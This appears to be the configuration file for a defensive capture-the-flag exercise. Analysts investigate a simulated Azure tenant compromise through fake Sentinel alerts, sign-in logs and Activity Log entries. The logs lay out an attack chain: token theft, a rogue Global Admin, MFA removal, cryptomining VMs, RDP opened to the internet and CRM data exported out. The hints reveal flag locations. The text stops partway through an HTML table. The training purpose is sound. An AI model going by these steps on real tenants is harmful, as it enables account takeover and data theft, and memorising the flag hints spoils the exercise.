/* ============================================================
   CTF ARENA — Box E1: The Azure Abyss
   Azure Tenant Compromise | OAuth Phishing, Entra ID PrivEsc, VM Deployment, SQL Exfil
   Config: filesystem, web app, az CLI simulation, flags, hints, lore
   ============================================================ */

const E1Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Azure Abyss',
    subtitle: 'Azure Tenant Compromise — OAuth Phishing, Entra ID Privilege Escalation, Cloud Resource Abuse',
    difficulty: 'Advanced',
    accent: '#0078d4',
    storageKey: 'hexworth_ctf_e1',
    registryId: 'e1-azure-abyss',
    trackerKey: 'ctf_e1',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Cloud attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'alert_analysis',
            name: 'Alert Analysis',
            icon: '\uD83D\uDEA8',
            description: 'Microsoft Sentinel fired an impossible travel alert. Analyze Entra ID sign-in logs to identify the compromised user account and locate the phishing email that stole the OAuth token.',
            requiredFlags: [],
            mitre: ['T1566.002', 'T1528', 'T1078.004'],
            unlocks: ['privesc'],
            locked: false
        },
        {
            id: 'privesc',
            name: 'Privilege Escalation',
            icon: '\uD83D\uDD11',
            description: 'The attacker used the compromised account to elevate privileges via Azure AD PowerShell. Trace Activity Log entries showing Global Admin role assignment, conditional access policy bypass, and MFA manipulation.',
            requiredFlags: ['user'],
            mitre: ['T1098.003', 'T1556.006', 'T1548'],
            unlocks: ['resource_tamper'],
            locked: true
        },
        {
            id: 'resource_tamper',
            name: 'Resource Tampering',
            icon: '\uD83D\uDCBB',
            description: 'Map all unauthorized Azure resource changes: rogue VM deployments for cryptomining, NSG rule modifications opening RDP to the internet, new storage accounts, and SQL Database exfiltration events in Activity Logs.',
            requiredFlags: ['internal'],
            mitre: ['T1578.002', 'T1562.007', 'T1530', 'T1537'],
            unlocks: ['containment'],
            locked: true
        },
        {
            id: 'containment',
            name: 'Containment and Recovery',
            icon: '\uD83D\uDEE1\uFE0F',
            description: 'Revoke attacker sessions, remove unauthorized role assignments, delete rogue VMs, restore NSG rules, rotate all credentials, and generate the incident timeline. Extract the final flag from the cryptomining VM ARM template.',
            requiredFlags: ['root'],
            mitre: ['T1531', 'T1070.004'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Review the Sentinel alert',
                tip: 'Open the Browser and navigate to https://sentinel.azure.local — or run: az monitor activity-log list --subscription HEXWORTH-PROD-001',
                trigger: { event: 'command', match: { cmd: 'contains:sentinel' } }
            },
            {
                title: 'Analyze Entra ID sign-in logs',
                tip: 'Run: az ad signin-logs list or browse to https://portal.azure.local/entra/signin-logs to find the impossible travel event and identify the compromised account.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:signin' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:ad user' } },
                        { event: 'command', match: { cmd: 'contains:entra' } }
                    ]
                }
            },
            {
                title: 'Find the phishing email',
                tip: 'Look in /home/analyst/evidence/emails/ for the original phishing message. Examine the Return-Path header for the attacker infrastructure domain.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Trace Activity Log privilege escalation',
                tip: 'Run: az monitor activity-log list --filter "operationName eq Microsoft.Authorization/roleAssignments/write" to find Global Admin role assignment entries.',
                trigger: { event: 'flag_correct', match: { flagId: 'internal' } }
            },
            {
                title: 'Extract the flag from the ARM template',
                tip: 'Run: cat /home/analyst/evidence/arm-templates/cryptominer-vm.json or az deployment group show to find the userData field in the VM deployment template.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (SY0-701)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user',     objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — OAuth token theft via spear-phishing and impossible travel detection',       skill: 'Cloud Phishing & Token Theft Detection' },
            { flagId: 'internal', objective: '2.3', description: 'Explain common vulnerabilities and threat vectors in cloud environments — Entra ID privilege escalation and conditional access bypass', skill: 'Entra ID Privilege Escalation Analysis' },
            { flagId: 'root',     objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Azure resource containment and incident response',           skill: 'Cloud Incident Response & Containment' },
            { flagId: 'root',     objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — ARM template forensics and cryptomining VM identification',               skill: 'ARM Template Forensics' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Azure Investigation Workstation v2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe)',
            'Network: Azure VPN Gateway — Connected',
            'Azure CLI: Authenticating to tenant HEXWORTH-CORP...',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS — Investigation Workstation',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu'
        ],
        loginUser: 'analyst'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',     icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Azure Portal', icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'analyst',
        hostname: 'azure-inv-ws',
        startDir: '/home/analyst',
        welcome: 'Ubuntu 22.04.3 LTS — Azure Investigation Workstation\n\nAzure CLI 2.58.0 authenticated.\nTenant: HEXWORTH-CORP (tenant-id: a3f82b19-cc41-4e8d-b712-9d04e1f73a2c)\nSubscription: HEXWORTH-PROD-001\n\nType \'az --help\' or \'help\' for available commands.\nMission: Investigate Microsoft Sentinel impossible travel alert — INC-2026-0087\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (investigation state)
    // ═══════════════════════════════════════════════════════

    _context: 'analyst',        // 'analyst' | 'az-cloud'
    _sentinelReviewed: false,
    _signinLogsReviewed: false,
    _activityLogReviewed: false,
    _rogueVmsFound: false,
    _nsgReviewed: false,
    _armTemplateFound: false,
    _containmentExecuted: false,

    _switchContext(ctx, term) {
        E1Config._context = ctx;
        if (term && term.config) {
            var prompt = E1Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'analyst';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (E1Config._context) {
            case 'az-cloud': return 'analyst@azure-inv-ws:~$ ';
            default: return null;
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED AZURE DATA (Activity Logs, Sign-in Logs, Resources)
    // ═══════════════════════════════════════════════════════

    _azureData: {

        // Entra ID sign-in logs — the impossible travel event
        signinLogs: [
            { id: 'signin-001', timestamp: '2026-03-18T07:14:22Z', userPrincipalName: 'lena.kovacs@hexworth-corp.com', displayName: 'Lena Kovacs', ipAddress: '81.23.14.55',  location: 'Budapest, Hungary', appDisplayName: 'Microsoft 365', status: 'Success',  riskLevel: 'high',   riskDetail: 'Impossible travel',        device: 'Unknown / Unknown',          correlationId: 'corr-a1b2c3d4' },
            { id: 'signin-002', timestamp: '2026-03-18T07:02:11Z', userPrincipalName: 'lena.kovacs@hexworth-corp.com', displayName: 'Lena Kovacs', ipAddress: '205.46.78.12', location: 'Dallas, TX, US',    appDisplayName: 'Microsoft 365', status: 'Success',  riskLevel: 'low',    riskDetail: 'None',                     device: 'LAPTOP-LK-2024 / Windows 11', correlationId: 'corr-e5f6g7h8' },
            { id: 'signin-003', timestamp: '2026-03-18T08:31:04Z', userPrincipalName: 'lena.kovacs@hexworth-corp.com', displayName: 'Lena Kovacs', ipAddress: '81.23.14.55',  location: 'Budapest, Hungary', appDisplayName: 'Azure Portal',  status: 'Success',  riskLevel: 'high',   riskDetail: 'Impossible travel',        device: 'Unknown / Unknown',          correlationId: 'corr-i9j0k1l2' },
            { id: 'signin-004', timestamp: '2026-03-18T08:33:55Z', userPrincipalName: 'lena.kovacs@hexworth-corp.com', displayName: 'Lena Kovacs', ipAddress: '81.23.14.55',  location: 'Budapest, Hungary', appDisplayName: 'Azure PowerShell', status: 'Success', riskLevel: 'high', riskDetail: 'Token replay detected',    device: 'Unknown / Unknown',          correlationId: 'corr-m3n4o5p6' },
            { id: 'signin-005', timestamp: '2026-03-18T06:58:30Z', userPrincipalName: 'marcus.webb@hexworth-corp.com', displayName: 'Marcus Webb', ipAddress: '98.103.44.21', location: 'Austin, TX, US',    appDisplayName: 'Microsoft 365', status: 'Success',  riskLevel: 'none',   riskDetail: 'None',                     device: 'DESKTOP-MW-01 / Windows 11',  correlationId: 'corr-q7r8s9t0' },
            { id: 'signin-006', timestamp: '2026-03-18T08:44:10Z', userPrincipalName: 'admin@hexworth-corp.com',       displayName: 'Tenant Admin', ipAddress: '81.23.14.55', location: 'Budapest, Hungary', appDisplayName: 'Azure AD PowerShell', status: 'Success', riskLevel: 'high', riskDetail: 'Admin account from risky IP', device: 'Unknown / Unknown',        correlationId: 'corr-u1v2w3x4' }
        ],

        // Microsoft Sentinel alert
        sentinelAlert: {
            alertId: 'INC-2026-0087',
            alertName: 'Impossible Travel Activity',
            severity: 'High',
            status: 'Active',
            createdTime: '2026-03-18T07:20:00Z',
            description: 'A user account signed in from two geographically distant locations within a 12-minute window. The travel time between locations is physically impossible, indicating either a stolen credential or a compromised OAuth token being replayed from a foreign location.',
            affectedEntities: ['lena.kovacs@hexworth-corp.com'],
            relatedAlerts: ['Token replay detected', 'Multiple failed MFA prompts bypassed'],
            tactics: ['InitialAccess', 'CredentialAccess'],
            techniques: ['T1528 — Steal Application Access Token', 'T1566.002 — Spearphishing Link'],
            investigationSteps: [
                '1. Review Entra ID sign-in logs for user lena.kovacs@hexworth-corp.com',
                '2. Compare login timestamps and source IPs',
                '3. Identify the OAuth application that issued the stolen token',
                '4. Check if any admin actions were performed after the foreign login',
                '5. Review Azure Activity Log for resource changes in the 08:30–09:30Z window'
            ]
        },

        // Azure Activity Log entries — the privilege escalation and resource abuse
        activityLog: [
            { timestamp: '2026-03-18T08:35:02Z', operationName: 'Microsoft.Authorization/roleAssignments/write',  caller: 'lena.kovacs@hexworth-corp.com', status: 'Succeeded', resourceGroup: 'rg-hexworth-core',     resourceType: 'Microsoft.Authorization/roleAssignments',  resourceName: 'role-assign-a9f3',    description: 'Added user x.phantom@protonmail.com to role: Global Administrator' },
            { timestamp: '2026-03-18T08:38:14Z', operationName: 'Microsoft.Authorization/policies/write',         caller: 'lena.kovacs@hexworth-corp.com', status: 'Succeeded', resourceGroup: 'rg-hexworth-core',     resourceType: 'Microsoft.Authorization/policies',         resourceName: 'ConditionalAccess-MFA', description: 'Modified conditional access policy: disabled MFA requirement for trusted IPs — added 81.23.14.0/24 as trusted' },
            { timestamp: '2026-03-18T08:41:07Z', operationName: 'Microsoft.Directory/users/strongAuthentication/update', caller: 'x.phantom@protonmail.com', status: 'Succeeded', resourceGroup: 'rg-hexworth-core', resourceType: 'Microsoft.Directory/users',                resourceName: 'lena.kovacs',         description: 'Removed MFA registration for user lena.kovacs@hexworth-corp.com' },
            { timestamp: '2026-03-18T09:02:33Z', operationName: 'Microsoft.Compute/virtualMachines/write',        caller: 'x.phantom@protonmail.com',     status: 'Succeeded', resourceGroup: 'rg-hexworth-compute',  resourceType: 'Microsoft.Compute/virtualMachines',        resourceName: 'vm-miner-node-01',    description: 'Deployed VM: vm-miner-node-01 (Standard_NC6 — GPU-optimized). ARM template deployment ref: deploy-miner-arm-01' },
            { timestamp: '2026-03-18T09:04:11Z', operationName: 'Microsoft.Compute/virtualMachines/write',        caller: 'x.phantom@protonmail.com',     status: 'Succeeded', resourceGroup: 'rg-hexworth-compute',  resourceType: 'Microsoft.Compute/virtualMachines',        resourceName: 'vm-miner-node-02',    description: 'Deployed VM: vm-miner-node-02 (Standard_NC6 — GPU-optimized). ARM template deployment ref: deploy-miner-arm-01' },
            { timestamp: '2026-03-18T09:06:44Z', operationName: 'Microsoft.Compute/virtualMachines/write',        caller: 'x.phantom@protonmail.com',     status: 'Succeeded', resourceGroup: 'rg-hexworth-compute',  resourceType: 'Microsoft.Compute/virtualMachines',        resourceName: 'vm-miner-node-03',    description: 'Deployed VM: vm-miner-node-03 (Standard_NC6 — GPU-optimized). ARM template deployment ref: deploy-miner-arm-01' },
            { timestamp: '2026-03-18T09:08:19Z', operationName: 'Microsoft.Network/networkSecurityGroups/securityRules/write', caller: 'x.phantom@protonmail.com', status: 'Succeeded', resourceGroup: 'rg-hexworth-compute', resourceType: 'Microsoft.Network/networkSecurityGroups', resourceName: 'nsg-prod-allow-rdp', description: 'Added NSG inbound rule: Allow TCP 3389 (RDP) from source 0.0.0.0/0 — priority 100' },
            { timestamp: '2026-03-18T09:11:55Z', operationName: 'Microsoft.Storage/storageAccounts/write',        caller: 'x.phantom@protonmail.com',     status: 'Succeeded', resourceGroup: 'rg-hexworth-data',     resourceType: 'Microsoft.Storage/storageAccounts',        resourceName: 'stexfildata2026',     description: 'Created storage account: stexfildata2026 (RA-GRS, public blob access enabled)' },
            { timestamp: '2026-03-18T09:14:22Z', operationName: 'Microsoft.Sql/servers/databases/export',         caller: 'x.phantom@protonmail.com',     status: 'Succeeded', resourceGroup: 'rg-hexworth-data',     resourceType: 'Microsoft.Sql/servers/databases',          resourceName: 'sqldb-hexworth-crm',  description: 'Database export initiated: sqldb-hexworth-crm -> stexfildata2026/crm-export-20260318.bacpac (6.4GB). Data classification tag: {{FLAG:internal}}' },
            { timestamp: '2026-03-18T09:18:03Z', operationName: 'Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write', caller: 'x.phantom@protonmail.com', status: 'Succeeded', resourceGroup: 'rg-hexworth-data', resourceType: 'Microsoft.Storage/storageAccounts', resourceName: 'stexfildata2026', description: 'Blob uploaded: crm-export-20260318.bacpac (6.4GB) to container: exfil-drop' }
        ],

        // Azure resources — current state (post-compromise)
        virtualMachines: [
            { name: 'vm-web-prod-01',     resourceGroup: 'rg-hexworth-compute', location: 'eastus', size: 'Standard_D2s_v3', status: 'Running',  osType: 'Linux',   created: '2025-11-04', tags: { env: 'production', owner: 'platform-team' } },
            { name: 'vm-app-prod-01',     resourceGroup: 'rg-hexworth-compute', location: 'eastus', size: 'Standard_D4s_v3', status: 'Running',  osType: 'Linux',   created: '2025-11-04', tags: { env: 'production', owner: 'platform-team' } },
            { name: 'vm-miner-node-01',   resourceGroup: 'rg-hexworth-compute', location: 'eastus', size: 'Standard_NC6',    status: 'Running',  osType: 'Linux',   created: '2026-03-18', tags: { env: 'test',       owner: 'x.phantom@protonmail.com' } },
            { name: 'vm-miner-node-02',   resourceGroup: 'rg-hexworth-compute', location: 'eastus', size: 'Standard_NC6',    status: 'Running',  osType: 'Linux',   created: '2026-03-18', tags: { env: 'test',       owner: 'x.phantom@protonmail.com' } },
            { name: 'vm-miner-node-03',   resourceGroup: 'rg-hexworth-compute', location: 'eastus', size: 'Standard_NC6',    status: 'Running',  osType: 'Linux',   created: '2026-03-18', tags: { env: 'test',       owner: 'x.phantom@protonmail.com' } }
        ],

        // NSG rules — current state
        nsgRules: [
            { name: 'allow-rdp-internet', direction: 'Inbound', priority: 100, protocol: 'TCP', sourcePortRange: '*',     destinationPortRange: '3389', sourceAddressPrefix: '0.0.0.0/0', access: 'Allow',  nsg: 'nsg-prod', rogue: true  },
            { name: 'allow-ssh-corp',     direction: 'Inbound', priority: 200, protocol: 'TCP', sourcePortRange: '*',     destinationPortRange: '22',   sourceAddressPrefix: '10.0.0.0/8', access: 'Allow',  nsg: 'nsg-prod', rogue: false },
            { name: 'allow-https',        direction: 'Inbound', priority: 300, protocol: 'TCP', sourcePortRange: '*',     destinationPortRange: '443',  sourceAddressPrefix: '*',           access: 'Allow',  nsg: 'nsg-prod', rogue: false },
            { name: 'deny-all-inbound',   direction: 'Inbound', priority: 4096, protocol: '*',  sourcePortRange: '*',     destinationPortRange: '*',    sourceAddressPrefix: '*',           access: 'Deny',   nsg: 'nsg-prod', rogue: false }
        ],

        // Azure AD users / directory
        users: [
            { userPrincipalName: 'lena.kovacs@hexworth-corp.com',  displayName: 'Lena Kovacs',    jobTitle: 'Senior Cloud Engineer',    department: 'Engineering',  mfaEnabled: false, roles: ['Global Administrator', 'Contributor'], riskLevel: 'high',   accountEnabled: true  },
            { userPrincipalName: 'marcus.webb@hexworth-corp.com',   displayName: 'Marcus Webb',    jobTitle: 'IT Director',              department: 'IT',           mfaEnabled: true,  roles: ['User Access Administrator'],          riskLevel: 'none',   accountEnabled: true  },
            { userPrincipalName: 'admin@hexworth-corp.com',         displayName: 'Tenant Admin',   jobTitle: 'Tenant Administrator',     department: 'IT',           mfaEnabled: true,  roles: ['Global Administrator'],               riskLevel: 'medium', accountEnabled: true  },
            { userPrincipalName: 'x.phantom@protonmail.com',        displayName: 'x.phantom',      jobTitle: 'N/A (External)',           department: 'N/A',          mfaEnabled: false, roles: ['Global Administrator'],               riskLevel: 'high',   accountEnabled: true  }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',     points: 100 },
        { id: 'internal', points: 150 },
        { id: 'root',     points: 250 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2400000, points: 150 },  // 40 minutes
        timeBonusThreshold: 4800                           // 80 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with the Sentinel alert. Run: az monitor activity-log list -- or open the Browser at https://sentinel.azure.local. The impossible travel alert names a specific user. Pull that user\'s Entra ID sign-in logs to find the Budapest login and the OAuth token theft timing.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The phishing email is in /home/analyst/evidence/emails/phish-lena-kovacs.eml. Look at the Return-Path header carefully. The attacker used a lookalike domain for their infrastructure. That domain — wrapped in the flag format — is your user flag.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'For the internal flag: run az monitor activity-log list and filter for export operations. Or in the Azure Portal navigate to the SQL databases section and look at the audit logs. The export log entry for sqldb-hexworth-crm contains a data classification tag that is the internal flag.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'For the root flag: the three rogue VMs (vm-miner-node-01/02/03) were deployed from an ARM template. Run: cat /home/analyst/evidence/arm-templates/cryptominer-vm.json and look for the customData field inside the osProfile section. It contains a base64-encoded cloud-init script with the flag.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Hexworth Corporation runs its entire production infrastructure on Microsoft Azure. Three hours ago, Microsoft Sentinel fired a high-severity alert: an employee\'s account authenticated from Dallas, Texas and Budapest, Hungary within twelve minutes — a physical impossibility. The SOC has escalated to you. Evidence suggests the attacker used a stolen OAuth token acquired through a targeted spear-phishing campaign. By the time the alert fired, they had already moved to expand their access. Your mission, Peerless: trace every action the attacker took, collect the evidence, and burn down their foothold.',
        scenario: 'Lena Kovacs is a Senior Cloud Engineer with Contributor rights across the production subscription. She received what appeared to be a Microsoft 365 document link three days ago. She clicked it, the page requested OAuth consent for "Microsoft Teams Integration," and she approved. The token was exfiltrated to attacker infrastructure. From Budapest, the attacker replayed the token, escalated to Global Admin via Azure AD PowerShell, disabled MFA for the compromised account, added themselves as Global Administrator, deployed three GPU-optimized VMs for Monero mining, opened RDP to the internet, created a new storage account, and exported the CRM database. This is the anatomy of a full Azure tenant compromise.',
        outro: 'The Hexworth Azure tenant has been fully mapped and contained. Attacker sessions revoked. Rogue VMs deleted. NSG rules restored. Role assignments cleaned. Credentials rotated. The CRM database export to the attacker\'s storage account represents 6.4GB of customer PII and business intelligence. Forensic preservation completed. The incident report is ready for legal and executive review. The cloud is locked down — for now.',
        ecer: {
            executive: 'No formal cloud security governance; Azure subscriptions managed with minimal oversight of role assignments and resource provisioning',
            culture: 'Engineers hold Contributor rights by default with no principle of least privilege enforced; OAuth consent policy allowed users to approve any third-party application',
            employee: 'Targeted spear-phishing with OAuth consent harvesting; MFA configured but no Conditional Access policy blocking unfamiliar devices; no alert for new Global Admin assignments',
            regulatory: 'CRM database contained customer PII subject to data protection regulations; no DLP controls on Azure SQL Database export functionality'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Azure Portal + Sentinel Dashboard
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'https://sentinel.azure.local/',

        pages: {

            // ── Microsoft Sentinel ──
            '/': {
                title: 'Microsoft Sentinel — Hexworth-Corp',
                html: function() {
                    return `
                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:20px; padding-bottom:14px; border-bottom:1px solid #ddd;">
                        <div style="width:32px; height:32px; background:#0078d4; border-radius:4px; display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:0.75rem;">MS</div>
                        <div>
                            <div style="font-weight:700; color:#1a1a2e; font-size:1rem;">Microsoft Sentinel</div>
                            <div style="color:#888; font-size:0.7rem;">Workspace: hexworth-sentinel | Subscription: HEXWORTH-PROD-001</div>
                        </div>
                    </div>

                    <div style="background:#fff3cd; border:1px solid #ffc107; border-radius:6px; padding:14px; margin-bottom:18px;">
                        <div style="font-weight:700; color:#856404; font-size:0.85rem;">1 High Severity Incident — Active</div>
                        <div style="color:#856404; font-size:0.75rem; margin-top:4px;">INC-2026-0087 requires immediate investigation</div>
                    </div>

                    <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-bottom:18px;">
                        <div style="background:#f8f9fa; border:1px solid #dee2e6; border-radius:6px; padding:12px; text-align:center;">
                            <div style="font-size:1.6rem; font-weight:700; color:#dc3545;">1</div>
                            <div style="color:#888; font-size:0.7rem;">High Severity</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #dee2e6; border-radius:6px; padding:12px; text-align:center;">
                            <div style="font-size:1.6rem; font-weight:700; color:#fd7e14;">3</div>
                            <div style="color:#888; font-size:0.7rem;">Medium Severity</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #dee2e6; border-radius:6px; padding:12px; text-align:center;">
                            <div style="font-size:1.6rem; font-weight:700; color:#0078d4;">12</div>
                            <div style="color:#888; font-size:0.7rem;">Total (7 days)</div>
                        </div>
                    </div>

                    <div style="border:1px solid #dee2e6; border-radius:6px; overflow:hidden;">
                        <div style="background:#f8f9fa; padding:8px 14px; font-size:0.75rem; font-weight:700; color:#555; display:grid; grid-template-columns:120px 1fr 80px 100px;">
                            <span>INCIDENT ID</span><span>TITLE</span><span>SEVERITY</span><span>STATUS</span>
                        </div>
                        <div style="padding:10px 14px; border-top:1px solid #eee; display:grid; grid-template-columns:120px 1fr 80px 100px; align-items:center; cursor:pointer; background:#fff8f8;" onclick="engine&&engine.browser&&engine.browser.navigate('/incidents/INC-2026-0087')">
                            <span style="font-family:monospace; font-size:0.75rem; color:#0078d4;">INC-2026-0087</span>
                            <span style="font-size:0.8rem; color:#1a1a2e;">Impossible Travel Activity</span>
                            <span style="font-size:0.75rem; background:#dc3545; color:#fff; padding:2px 8px; border-radius:10px; text-align:center;">High</span>
                            <span style="font-size:0.75rem; color:#dc3545; font-weight:700;">Active</span>
                        </div>
                        <div style="padding:10px 14px; border-top:1px solid #eee; display:grid; grid-template-columns:120px 1fr 80px 100px; align-items:center; cursor:pointer;" onclick="engine&&engine.browser&&engine.browser.navigate('/incidents/INC-2026-0084')">
                            <span style="font-family:monospace; font-size:0.75rem; color:#0078d4;">INC-2026-0084</span>
                            <span style="font-size:0.8rem; color:#555;">Suspicious OAuth consent granted</span>
                            <span style="font-size:0.75rem; background:#fd7e14; color:#fff; padding:2px 8px; border-radius:10px; text-align:center;">Medium</span>
                            <span style="font-size:0.75rem; color:#888;">Closed</span>
                        </div>
                    </div>

                    <div style="margin-top:12px; font-size:0.72rem; color:#aaa; text-align:center;">
                        Navigate to <a href="#" onclick="engine&&engine.browser&&engine.browser.navigate('/incidents/INC-2026-0087'); return false;" style="color:#0078d4;">INC-2026-0087</a> for full alert details
                    </div>`;
                },
                formHandler: null
            },

            // ── Sentinel Incident Detail ──
            '/incidents/INC-2026-0087': {
                title: 'INC-2026-0087 — Impossible Travel Activity',
                html: function() {
                    E1Config._sentinelReviewed = true;
                    const a = E1Config._azureData.sentinelAlert;
                    return `
                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:16px;">
                        <span style="background:#dc3545; color:#fff; padding:3px 10px; border-radius:10px; font-size:0.72rem; font-weight:700;">HIGH</span>
                        <span style="font-weight:700; color:#1a1a2e; font-size:1rem;">${a.alertName}</span>
                        <span style="color:#888; font-size:0.75rem; margin-left:auto;">${a.alertId}</span>
                    </div>

                    <div style="background:#fff3cd; border-left:4px solid #ffc107; padding:10px 14px; margin-bottom:16px; font-size:0.8rem; color:#533f03;">
                        ${a.description}
                    </div>

                    <div style="display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:16px; font-size:0.78rem;">
                        <div style="background:#f8f9fa; border-radius:6px; padding:10px;">
                            <div style="color:#888; margin-bottom:4px; font-size:0.7rem;">AFFECTED ENTITY</div>
                            <div style="color:#1a1a2e; font-weight:700;">${a.affectedEntities[0]}</div>
                        </div>
                        <div style="background:#f8f9fa; border-radius:6px; padding:10px;">
                            <div style="color:#888; margin-bottom:4px; font-size:0.7rem;">CREATED</div>
                            <div style="color:#1a1a2e;">${a.createdTime}</div>
                        </div>
                    </div>

                    <div style="margin-bottom:16px;">
                        <div style="font-size:0.75rem; font-weight:700; color:#555; margin-bottom:6px; text-transform:uppercase; letter-spacing:0.05em;">MITRE ATT&CK Techniques</div>
                        ${a.techniques.map(t => `<div style="font-size:0.75rem; color:#0078d4; font-family:monospace; margin-bottom:2px;">${t}</div>`).join('')}
                    </div>

                    <div style="border:1px solid #dee2e6; border-radius:6px; padding:12px; margin-bottom:14px;">
                        <div style="font-size:0.75rem; font-weight:700; color:#555; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.05em;">Recommended Investigation Steps</div>
                        ${a.investigationSteps.map(s => `<div style="font-size:0.78rem; color:#333; margin-bottom:4px; padding-left:4px;">${s}</div>`).join('')}
                    </div>

                    <div style="font-size:0.72rem; color:#aaa; text-align:center;">
                        View full sign-in logs: <a href="#" onclick="engine&&engine.browser&&engine.browser.navigate('/entra/signin-logs'); return false;" style="color:#0078d4;">Entra ID Sign-in Logs</a>
                    </div>`;
                },
                formHandler: null
            },

            // ── Entra ID Sign-in Logs ──
            '/entra/signin-logs': {
                title: 'Entra ID — Sign-in Logs',
                html: function() {
                    E1Config._signinLogsReviewed = true;
                    const logs = E1Config._azureData.signinLogs;
                    const rows = logs.map(l => {
                        const riskColor = l.riskLevel === 'high' ? '#dc3545' : l.riskLevel === 'medium' ? '#fd7e14' : '#198754';
                        const locFlag = l.location.includes('Budapest') ? ' <span style="background:#dc3545; color:#fff; font-size:0.62rem; padding:1px 5px; border-radius:8px; margin-left:4px;">SUSPICIOUS</span>' : '';
                        return `<tr style="border-bottom:1px solid #eee;">
                            <td style="padding:6px 8px; font-size:0.72rem; color:#666;">${l.timestamp}</td>
                            <td style="padding:6px 8px; font-size:0.75rem; color:#0078d4;">${l.userPrincipalName}</td>
                            <td style="padding:6px 8px; font-size:0.72rem; font-family:monospace;">${l.ipAddress}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${l.location}${locFlag}</td>
                            <td style="padding:6px 8px; font-size:0.72rem;">${l.appDisplayName}</td>
                            <td style="padding:6px 8px;"><span style="font-size:0.68rem; background:${riskColor}; color:#fff; padding:2px 6px; border-radius:8px;">${l.riskLevel.toUpperCase()}</span></td>
                            <td style="padding:6px 8px; font-size:0.7rem; color:#666;">${l.riskDetail}</td>
                        </tr>`;
                    }).join('');
                    return `
                    <div style="display:flex; align-items:center; gap:10px; margin-bottom:16px; padding-bottom:10px; border-bottom:1px solid #ddd;">
                        <div style="font-weight:700; color:#1a1a2e;">Entra ID Sign-in Logs</div>
                        <div style="font-size:0.72rem; color:#888; margin-left:auto;">Last 24 hours — filtered: lena.kovacs, x.phantom</div>
                    </div>
                    <div style="overflow-x:auto;">
                    <table style="width:100%; border-collapse:collapse; font-size:0.75rem;">
                        <thead><tr style="background:#f8f9fa;">
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6; white-space:nowrap;">Timestamp (UTC)</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">User</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">IP Address</th>
                            <th style="padding:6px 8px; text-align:left; color:#0078d4; border-bottom:2px solid #dee2e6;">Location</th>
